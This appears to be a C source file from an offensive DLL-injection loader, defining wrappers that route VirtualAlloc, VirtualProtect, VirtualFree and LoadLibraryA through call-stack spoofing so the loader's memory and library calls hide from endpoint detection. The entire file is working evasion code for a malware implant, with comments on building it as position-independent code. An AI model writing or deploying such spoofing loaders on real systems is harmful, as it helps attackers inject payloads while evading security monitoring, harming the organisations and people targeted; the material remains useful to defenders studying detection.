/*
 * loader_hooks.c — Lite spoof wrappers for the four Win32 calls the loader
 * itself makes during DLL injection (VirtualAlloc, VirtualProtect,
 * VirtualFree, LoadLibraryA).
 *
 * These are merged into loader.spec's make-pic object.  They deliberately
 * contain NO global state (no g_gates, no BSS) because Crystal Palace
 * cannot process IMAGE_REL_AMD64_ADDR64 / .bss relocations during PIC
 * conversion.  Gate-enabled versions of these same functions live in
 * hooks.c and are loaded exclusively by pico.spec.
 */

#include <windows.h>
#include "spoof.h"

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA  ( LPCSTR  lpLibFileName );
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$VirtualAlloc  ( LPVOID  lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect );
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualProtect ( LPVOID  lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect );
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualFree   ( LPVOID  lpAddress, SIZE_T dwSize, DWORD dwFreeType );

HMODULE WINAPI _LoadLibraryA ( LPCSTR lpLibFileName )
{
    FUNCTION_CALL call = { 0 };

    call.ptr     = ( PVOID ) ( KERNEL32$LoadLibraryA );
    call.argc    = 1;
    call.args[0] = spoof_arg( lpLibFileName );

    return ( HMODULE ) spoof_call( &call );
}

LPVOID WINAPI _VirtualAlloc ( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect )
{
    FUNCTION_CALL call = { 0 };

    call.ptr     = ( PVOID ) ( KERNEL32$VirtualAlloc );
    call.argc    = 4;
    call.args[0] = spoof_arg( lpAddress );
    call.args[1] = spoof_arg( dwSize );
    call.args[2] = spoof_arg( flAllocationType );
    call.args[3] = spoof_arg( flProtect );

    return ( LPVOID ) spoof_call( &call );
}

BOOL WINAPI _VirtualProtect ( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect )
{
    FUNCTION_CALL call = { 0 };

    call.ptr     = ( PVOID ) ( KERNEL32$VirtualProtect );
    call.argc    = 4;
    call.args[0] = spoof_arg( lpAddress );
    call.args[1] = spoof_arg( dwSize );
    call.args[2] = spoof_arg( flNewProtect );
    call.args[3] = spoof_arg( lpflOldProtect );

    return ( BOOL ) spoof_call( &call );
}

BOOL WINAPI _VirtualFree ( LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType )
{
    FUNCTION_CALL call = { 0 };

    call.ptr     = ( PVOID ) ( KERNEL32$VirtualFree );
    call.argc    = 3;
    call.args[0] = spoof_arg( lpAddress );
    call.args[1] = spoof_arg( dwSize );
    call.args[2] = spoof_arg( dwFreeType );

    return ( BOOL ) spoof_call( &call );
}
